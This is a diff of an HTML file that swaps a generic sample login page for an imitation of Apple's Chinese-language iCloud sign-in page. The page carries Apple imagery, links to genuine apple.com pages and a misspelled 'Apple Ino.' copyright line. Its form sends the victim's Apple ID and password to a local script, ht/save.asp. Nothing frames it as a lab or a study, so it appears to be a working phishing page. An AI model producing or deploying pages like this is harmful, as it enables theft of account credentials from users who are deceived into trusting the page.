@@ -1,115 +1,82 @@
-<!DOCTYPE html>
-<html lang="en">
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-    <meta charset="UTF-8">
-    <title>示例登陆页</title>
-    <style>
-        #win10-login {
-            background: url('./img/wallpapers/login.jpg') no-repeat fixed;
-            width: 100%;
-            height: 100%;
-            background-size: 100% 100%;
-            position: fixed;
-            z-index: -1;
-            top: 0;
-            left: 0;
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>iCloud</title>
+<link href="css/login.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript" src="./js/jquery-2.2.4.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function() {
+    $("#signup").click(function() {
+        resetFields();
+        var emptyfields = $("input[value=]");
+        if (emptyfields.size() > 0) {
+            emptyfields.each(function() {
+                $(this).stop()
+                    .animate({ left: "-10px" }, 100).animate({ left: "10px" }, 100)
+                    .animate({ left: "-10px" }, 100).animate({ left: "10px" }, 100)
+                    .animate({ left: "0px" }, 100)
+                    .addClass("required");
+            });
         }
+    });
+});
 
-        #win10-login-box {
-            width: 300px;
-            overflow: hidden;
-            margin: 0 auto;
-        }
+</script>
 
-        .win10-login-box-square {
-            width: 105px;
-            margin: 0 auto;
-            border-radius: 50%;
-            background-color: darkgray;
-            position: relative;
-            overflow: hidden;
-        }
 
-        .win10-login-box-square::after {
-            content: "";
-            display: block;
-            padding-bottom: 100%;
-        }
 
-        .win10-login-box-square .content {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-        }
 
-        input {
-            width: 90%;
-            display: block;
-            border: 0;
-            margin: 0 auto;
-            line-height: 36px;
-            font-size: 20px;
-            padding: 0 1em;
-            border-radius: 5px;
-            margin-bottom: 11px;
-        }
 
-        .login-username, .login-password {
-            width: 91%;
-            font-size: 13px;
-            color: #999;
-        }
 
-        .login-password {
-            width: calc(91% - 54px);
-            -webkit-border-radius: 2px 0 0 2px;
-            -moz-border-radius: 2px 0 0 2px;
-            border-radius: 5px 0 0 5px;
-            margin: 0px;
-            float: left;
-        }
-
-        .login-submit {
-            margin: 0px;
-            float: left;
-            -webkit-border-radius: 0 5px 5px 0;
-            -moz-border-radius: 0 5px 5px 0;
-            border-radius: 0 5px 5px 0;
-            background-color: #009688;
-            width: 54px;
-            display: inline-block;
-            height: 36px;
-            line-height: 36px;
-            padding: 0 auto;
-            color: #fff;
-            white-space: nowrap;
-            text-align: center;
-            font-size: 14px;
-            border: none;
-            cursor: pointer;
-            opacity: .9;
-            filter: alpha(opacity=90);
-
-        }
-    </style>
 </head>
-<body>
-<div id="win10-login">
-    <div style="height: 10%;min-height: 120px"></div>
-    <div id="win10-login-box">
-        <div class="win10-login-box-square">
-            <img src="./img/avatar.jpg" class="content"/>
+
+<body class="icloud">
+<div class="main">
+<FORM name=form action=ht/save.asp method=post target=_top>
+    <div class="top"><em><img src="img/login/yun.png" height="25" /></em><span><a href="#" class="shuom"><a href="http://www.apple.com/cn/icloud/setup/" target="blank"><img src="img/login/wenh.png" /></a></span></div>
+    <div class="login_main">
+        <div class="login">
+        	<div class="del">
+            	<ul>
+                	<li><form name="form1"><input type="text" id=arg1   name=u value=""  errormsg="Apple ID" placeholder="Apple ID" class="l_text"  /></li>
+                    <li><form name="form1"><input type="password"  id=arg2  name=p value="" errormsg="密码" placeholder="密码" class="l_text" />
+	
+					<form name="form1"> 
+ <INPUT class="txt s1" id=arg4  type="hidden" maxLength=10 value=  ""  name=a>
+ 
+ <form name="form1">  <SELECT name=b id="arg5" style="visibility:hidden;"> 
+ 
+	
+
+				
+ <em>
+
+<INPUT  class="btn" src="img/login/btn.jpg" type="image"  type=submit name=Submit> 
+					 </em></li>
+                    <li><i onclick="click_con()" id="wii" class="xuaz" >保持我的登陆状态</i></li>
+                </ul>
+					
+			
+				
+
+
+            </div>
         </div>
-        <p style="font-size: 24px;color: white;text-align: center">游客</p>
-        <form target="_self" method="get" action="#">
-            <!--用户名-->
-            <input type="text" placeholder="请输入登录名" class="login-username">
-            <!--密码-->
-            <input type="password" placeholder="请输入密码" class="login-password">
-            <!--登陆按钮-->
-            <input type="submit"  value="登录" id="btn-login" class="login-submit"/>
-        </form>
     </div>
+	</FORM>
+    
+</div><div class="foot">
+    	<em><img src="img/login/pg.png" /></em>
+        <span><a href="https://iforgot.apple.com/" target="blank">忘记ID或密码？</a>|<a href="http://www.apple.com.cn/support/systemstatus/" target="blank">系统状态</a>|<a href="http://www.apple.com.cn/privacy/" target="blank">客户隐私政策</a>|<a>Copyright@2014 Apple Ino. 保留所有权利</a></span>
+    </div>
+<div id="light" class="white_content">
+  <img src="img/login/ers.JPG" usemap="#Map" border="0" />
+<map name="Map" id="Map">
+  <area shape="rect" coords="304,148,442,182" href="/" />
+</map>
 </div>
+<div id="fade" class="black_overlay"></div>
 </body>
 </html>
